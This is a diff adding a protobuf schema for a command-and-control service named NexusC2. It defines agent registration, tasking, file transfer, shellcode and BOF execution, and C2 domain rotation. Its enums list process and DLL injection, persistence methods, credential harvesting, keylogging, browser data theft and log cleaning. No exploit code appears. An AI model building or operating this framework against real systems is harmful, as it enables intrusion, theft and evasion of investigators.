@@ -1,0 +1,308 @@
+syntax = "proto3";
+
+package nexus.v1;
+
+import "google/protobuf/timestamp.proto";
+import "google/protobuf/empty.proto";
+
+// Main C2 service definition
+service NexusC2 {
+  // Agent registration and management
+  rpc RegisterAgent(RegistrationRequest) returns (RegistrationResponse);
+  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
+  rpc GetAgentInfo(AgentInfoRequest) returns (AgentInfoResponse);
+  
+  // Task management
+  rpc GetTasks(TaskRequest) returns (stream Task);
+  rpc SubmitTaskResult(TaskResult) returns (TaskResultResponse);
+  
+  // File operations
+  rpc UploadFile(stream FileChunk) returns (FileUploadResponse);
+  rpc DownloadFile(FileDownloadRequest) returns (stream FileChunk);
+  
+  // Advanced execution
+  rpc ExecuteShellcode(ShellcodeRequest) returns (ShellcodeResponse);
+  rpc ExecuteBOF(BOFRequest) returns (BOFResponse);
+}
+
+// Agent registration messages
+message RegistrationRequest {
+  string hostname = 1;
+  string os_type = 2;
+  string os_version = 3;
+  string ip_address = 4;
+  string username = 5;
+  uint32 process_id = 6;
+  string process_name = 7;
+  string architecture = 8;
+  repeated string capabilities = 9;
+  string public_key = 10; // For additional crypto beyond TLS
+}
+
+message RegistrationResponse {
+  string agent_id = 1;
+  bool success = 2;
+  string message = 3;
+  repeated string assigned_domains = 4; // Fallback C2 domains
+  ConfigUpdate config = 5;
+}
+
+// Heartbeat messages
+message HeartbeatRequest {
+  string agent_id = 1;
+  SystemStatus status = 2;
+  repeated TaskStatus task_statuses = 3;
+}
+
+message HeartbeatResponse {
+  bool success = 1;
+  uint32 heartbeat_interval = 2; // Seconds until next heartbeat
+  repeated string new_domains = 3; // Domain rotation
+  ConfigUpdate config_update = 4;
+}
+
+// System status information
+message SystemStatus {
+  double cpu_usage = 1;
+  uint64 memory_usage_mb = 2;
+  uint64 disk_free_mb = 3;
+  repeated NetworkInterface interfaces = 4;
+  repeated ProcessInfo running_processes = 5;
+}
+
+message NetworkInterface {
+  string name = 1;
+  string ip_address = 2;
+  string mac_address = 3;
+  string interface_type = 4;
+}
+
+message ProcessInfo {
+  uint32 pid = 1;
+  string name = 2;
+  string executable_path = 3;
+  string command_line = 4;
+  uint64 memory_usage_kb = 5;
+  double cpu_usage_percent = 6;
+}
+
+// Task management
+message TaskRequest {
+  string agent_id = 1;
+  uint32 max_tasks = 2; // Maximum tasks to return
+}
+
+message Task {
+  string task_id = 1;
+  TaskType task_type = 2;
+  string command = 3;
+  map<string, string> parameters = 4;
+  google.protobuf.Timestamp created_at = 5;
+  google.protobuf.Timestamp scheduled_for = 6;
+  uint32 timeout_seconds = 7;
+  uint32 priority = 8;
+  uint32 max_retries = 9;
+}
+
+enum TaskType {
+  TASK_TYPE_UNSPECIFIED = 0;
+  TASK_TYPE_SHELL_COMMAND = 1;
+  TASK_TYPE_POWERSHELL_COMMAND = 2;
+  TASK_TYPE_FILE_UPLOAD = 3;
+  TASK_TYPE_FILE_DOWNLOAD = 4;
+  TASK_TYPE_DIRECTORY_LISTING = 5;
+  TASK_TYPE_PROCESS_LIST = 6;
+  TASK_TYPE_SYSTEM_INFO = 7;
+  TASK_TYPE_NETWORK_INFO = 8;
+  TASK_TYPE_REGISTRY_QUERY = 9;
+  TASK_TYPE_REGISTRY_SET = 10;
+  TASK_TYPE_SERVICE_CONTROL = 11;
+  // Advanced execution methods
+  TASK_TYPE_FIBER_SHELLCODE = 20;
+  TASK_TYPE_FIBER_HOLLOWING = 21;
+  TASK_TYPE_PROCESS_INJECTION = 22;
+  TASK_TYPE_DLL_INJECTION = 23;
+  TASK_TYPE_APC_INJECTION = 24;
+  TASK_TYPE_EARLY_BIRD_INJECTION = 25;
+  TASK_TYPE_BOF_EXECUTION = 26;
+  TASK_TYPE_COFF_LOADING = 27;
+  // Persistence
+  TASK_TYPE_REGISTRY_PERSISTENCE = 30;
+  TASK_TYPE_SERVICE_PERSISTENCE = 31;
+  TASK_TYPE_TASK_SCHEDULER_PERSISTENCE = 32;
+  TASK_TYPE_STARTUP_PERSISTENCE = 33;
+  // Reconnaissance
+  TASK_TYPE_NETWORK_SCAN = 40;
+  TASK_TYPE_CREDENTIAL_HARVESTING = 41;
+  TASK_TYPE_BROWSER_DATA_EXTRACTION = 42;
+  TASK_TYPE_SCREEN_CAPTURE = 43;
+  TASK_TYPE_KEYLOGGER_START = 44;
+  TASK_TYPE_KEYLOGGER_STOP = 45;
+  // Cleanup
+  TASK_TYPE_SELF_DESTRUCT = 50;
+  TASK_TYPE_LOG_CLEANING = 51;
+  TASK_TYPE_ARTIFACT_REMOVAL = 52;
+}
+
+message TaskStatus {
+  string task_id = 1;
+  TaskExecutionStatus status = 2;
+  string message = 3;
+  google.protobuf.Timestamp updated_at = 4;
+}
+
+enum TaskExecutionStatus {
+  TASK_EXECUTION_STATUS_UNSPECIFIED = 0;
+  TASK_EXECUTION_STATUS_PENDING = 1;
+  TASK_EXECUTION_STATUS_RUNNING = 2;
+  TASK_EXECUTION_STATUS_COMPLETED = 3;
+  TASK_EXECUTION_STATUS_FAILED = 4;
+  TASK_EXECUTION_STATUS_TIMEOUT = 5;
+  TASK_EXECUTION_STATUS_CANCELLED = 6;
+}
+
+message TaskResult {
+  string task_id = 1;
+  string agent_id = 2;
+  TaskExecutionStatus status = 3;
+  string output = 4;
+  string error_message = 5;
+  google.protobuf.Timestamp start_time = 6;
+  google.protobuf.Timestamp end_time = 7;
+  uint64 execution_duration_ms = 8;
+  int32 exit_code = 9;
+  repeated TaskArtifact artifacts = 10;
+}
+
+message TaskResultResponse {
+  bool success = 1;
+  string message = 2;
+}
+
+message TaskArtifact {
+  ArtifactType artifact_type = 1;
+  string name = 2;
+  bytes data = 3;
+  map<string, string> metadata = 4;
+}
+
+enum ArtifactType {
+  ARTIFACT_TYPE_UNSPECIFIED = 0;
+  ARTIFACT_TYPE_SCREENSHOT = 1;
+  ARTIFACT_TYPE_LOG_FILE = 2;
+  ARTIFACT_TYPE_CREDENTIAL_DUMP = 3;
+  ARTIFACT_TYPE_PROCESS_DUMP = 4;
+  ARTIFACT_TYPE_MEMORY_DUMP = 5;
+  ARTIFACT_TYPE_REGISTRY_DUMP = 6;
+  ARTIFACT_TYPE_NETWORK_CAPTURE = 7;
+  ARTIFACT_TYPE_FILE_CONTENT = 8;
+  ARTIFACT_TYPE_CONFIG_DATA = 9;
+  ARTIFACT_TYPE_CUSTOM = 10;
+}
+
+// File operations
+message FileChunk {
+  string filename = 1;
+  bytes data = 2;
+  uint64 offset = 3;
+  uint64 total_size = 4;
+  string checksum = 5; // SHA256 hash of complete file
+}
+
+message FileUploadResponse {
+  bool success = 1;
+  string message = 2;
+  string file_id = 3;
+}
+
+message FileDownloadRequest {
+  string agent_id = 1;
+  string file_path = 2;
+  uint64 offset = 3;
+  uint32 chunk_size = 4;
+}
+
+// Advanced execution
+message ShellcodeRequest {
+  string agent_id = 1;
+  bytes shellcode = 2;
+  ShellcodeExecutionMethod method = 3;
+  string target_process = 4; // For injection methods
+  uint32 target_pid = 5;     // For PID-based injection
+  map<string, string> options = 6;
+}
+
+enum ShellcodeExecutionMethod {
+  SHELLCODE_EXECUTION_METHOD_UNSPECIFIED = 0;
+  SHELLCODE_EXECUTION_METHOD_DIRECT_FIBER = 1;
+  SHELLCODE_EXECUTION_METHOD_FIBER_HOLLOWING = 2;
+  SHELLCODE_EXECUTION_METHOD_EARLY_BIRD = 3;
+  SHELLCODE_EXECUTION_METHOD_PROCESS_INJECTION = 4;
+  SHELLCODE_EXECUTION_METHOD_APC_INJECTION = 5;
+  SHELLCODE_EXECUTION_METHOD_DLL_INJECTION = 6;
+}
+
+message ShellcodeResponse {
+  bool success = 1;
+  string message = 2;
+  uint32 process_id = 3; // PID of target process if applicable
+}
+
+// BOF (Beacon Object File) execution
+message BOFRequest {
+  string agent_id = 1;
+  bytes bof_data = 2;
+  string function_name = 3;
+  repeated BOFArgument arguments = 4;
+  map<string, string> options = 5;
+}
+
+message BOFArgument {
+  BOFArgumentType type = 1;
+  bytes value = 2;
+}
+
+enum BOFArgumentType {
+  BOF_ARGUMENT_TYPE_UNSPECIFIED = 0;
+  BOF_ARGUMENT_TYPE_INT32 = 1;
+  BOF_ARGUMENT_TYPE_INT16 = 2;
+  BOF_ARGUMENT_TYPE_STRING = 3;
+  BOF_ARGUMENT_TYPE_WSTRING = 4;
+  BOF_ARGUMENT_TYPE_BINARY = 5;
+}
+
+message BOFResponse {
+  bool success = 1;
+  string message = 2;
+  string output = 3;
+}
+
+// Configuration updates
+message ConfigUpdate {
+  repeated string c2_domains = 1;
+  uint32 heartbeat_interval = 2;
+  uint32 max_retry_attempts = 3;
+  map<string, string> settings = 4;
+  CertificateUpdate certificate_update = 5;
+}
+
+message CertificateUpdate {
+  bytes certificate = 1;
+  bytes private_key = 2;
+  bytes ca_certificate = 3;
+  google.protobuf.Timestamp expires_at = 4;
+}
+
+// Agent info request
+message AgentInfoRequest {
+  string agent_id = 1;
+}
+
+message AgentInfoResponse {
+  string agent_id = 1;
+  RegistrationRequest registration_info = 2;
+  google.protobuf.Timestamp last_seen = 3;
+  SystemStatus current_status = 4;
+  repeated string active_tasks = 5;
+  bool is_online = 6;
+}
